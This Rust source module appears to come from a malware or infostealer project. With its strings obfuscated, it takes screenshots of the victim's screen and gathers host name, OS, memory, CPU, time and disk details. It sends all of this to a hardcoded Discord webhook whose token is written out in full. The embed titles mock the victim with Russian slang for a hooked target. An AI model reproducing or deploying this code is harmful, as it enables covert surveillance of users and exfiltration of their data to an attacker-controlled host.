use chrono::{Local, Utc};
use sysinfo::System;
use webhook::client::WebhookClient;
use human_bytes::human_bytes;
use crate::screenshot;

pub(crate) async fn send_message() {
    let url: String = lc!( "https://discord.com/api/webhooks/1215731916465115156/_o8vpLX78E9m7mUwX4dE-X7cU7cuZ5fTGhIt46ylPgpnhGtM5WhU9wA89z8MzdTx7cuj");
    let client: WebhookClient = WebhookClient::new(&url);
    let img_url = screenshot::url_screnshot().await;
    client.send(|message| message
        .embed(|embed| embed
            .color(&lc!("7112636"))
            .title(&lc!("Гой прогрет"))
            .description(&get_info())
            .image(&img_url)
        )).await.unwrap();
}


pub(crate) async fn send_disk_message(disk: String) {
    let url: String = lc!( "https://discord.com/api/webhooks/1215731916465115156/_o8vpLX78E9m7mUwX4dE-X7cU7cuZ5fTGhIt46ylPgpnhGtM5WhU9wA89z8MzdTx7cuj");
    let client: WebhookClient = WebhookClient::new(&url);
    let img_url = screenshot::url_screnshot().await;
    client.send(|message| message
        .embed(|embed| embed
            .color(&lc!("15417396"))
            .title(&lc!("Доп. информациия"))
            .description(&get_info_ext(disk.clone()))
            .image(&img_url)
        )).await.unwrap();
}

fn get_info() -> String {
    let mut description = String::new();
    let mut sys = System::new_all();
    let now_local = Local::now().format(&lc!("%Y-%m-%d %H:%M:%S")).to_string();
    let now_utc = Utc::now().format(&lc!("%Y-%m-%d %H:%M:%S")).to_string();
    sys.refresh_all();
    let length: usize = 30;
    description.push_str(format!("`{}: {}`\n", lc!("System host"), normalize_string(System::host_name().unwrap(), length)).as_str());
    description.push_str(format!("`{}: {}`\n", lc!("System name"), normalize_string(System::name().unwrap(), length)).as_str());
    description.push_str(format!("`{}:{}`\n", lc!("Memory total"), normalize_string(human_bytes(sys.total_memory() as f64), length)).as_str());
    description.push_str(format!("`{}:   {}`\n", lc!("CPU cores"), normalize_string(sys.cpus().len().to_string(), length)).as_str());
    description.push_str(format!("`{}:  {}`\n", lc!("Local time"), normalize_string(now_local, length)).as_str());
    description.push_str(format!("`{}:    {}`\n", lc!("UTC time"), normalize_string(now_utc, length)).as_str());
    description
}

fn get_info_ext(disk: String) -> String {
    let mut description = String::new();
    let mut sys = System::new_all();
    sys.refresh_all();
    let length: usize = 30;
    description.push_str(format!("`{}: {}`\n", lc!("System host"), normalize_string(System::host_name().unwrap(), length)).as_str());
    description.push_str(format!("`{}:        {}`\n", lc!("Disk"), normalize_string(disk, length)).as_str());
    description
}

fn normalize_string(string: String, preferred_length: usize) -> String {
    let length = string.len();
    let mut new_string = String::new();
    for _i in 0..preferred_length - length {
        new_string.push(' ');
    }
    new_string = format!("{}{}", new_string, string);
    new_string
}